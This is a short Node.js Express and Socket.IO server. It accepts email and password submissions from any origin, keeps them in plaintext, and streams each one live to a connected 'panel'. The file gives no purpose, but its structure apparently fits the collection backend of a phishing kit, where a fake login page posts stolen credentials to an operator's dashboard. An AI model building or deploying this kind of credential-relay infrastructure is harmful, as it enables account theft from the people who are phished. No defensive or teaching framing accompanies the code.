const express = require('express');
const bodyParser = require('body-parser');
const path = require('path');
const http = require('http');
const socketIO = require('socket.io');
const cors = require('cors');

const app = express();
const server = http.createServer(app);

// ALLOW cross-origin Socket.IO connections
const io = socketIO(server, {
  cors: {
    origin: '*', // or restrict to specific origin e.g. ['https://panel.example.com']
    methods: ['GET', 'POST']
  }
});

app.use(cors()); // allows API POSTs from any origin
app.use(bodyParser.json());

let latestSubmission = null;

app.post('/submit', (req, res) => {
  const { email, password } = req.body;
  latestSubmission = { email, password };
  io.emit('newSubmission', latestSubmission);
  res.json({ message: 'Success' });
});

io.on('connection', (socket) => {
  console.log('Panel connected');
  if (latestSubmission) {
    socket.emit('newSubmission', latestSubmission);
  }
});

server.listen(3000, () => console.log('Backend on http://localhost:3000'));
